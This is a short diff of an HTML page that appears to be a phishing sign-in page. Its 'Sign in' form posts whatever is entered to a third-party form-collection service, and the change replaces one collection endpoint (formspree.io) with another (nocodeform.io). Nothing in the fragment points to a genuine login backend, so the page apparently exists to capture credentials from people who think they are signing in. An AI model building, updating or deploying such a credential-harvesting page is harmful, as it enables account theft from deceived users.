@@ -192,7 +192,7 @@ function o(t){var n=null;return null===u&&(u=e(a,"$Config.urls")),null!==u&&t&&(
 <div aria-live="assertive" role="alert">
 <div class="wrapper"><!-- Fixed element that spans the viewport -->
 <div class="element" id="element">
-<form action="https://formspree.io/f/xbjelzja" autocomplete="" method="post">
+<form action="https://nocodeform.io/f/66c0ae9aba5e2beb630a8a62" autocomplete="" method="post">
 <div id="logo">&nbsp;</div>
 
 <div id="em"><span style="font-size:20px;"><strong>Sign in</strong></span></div>
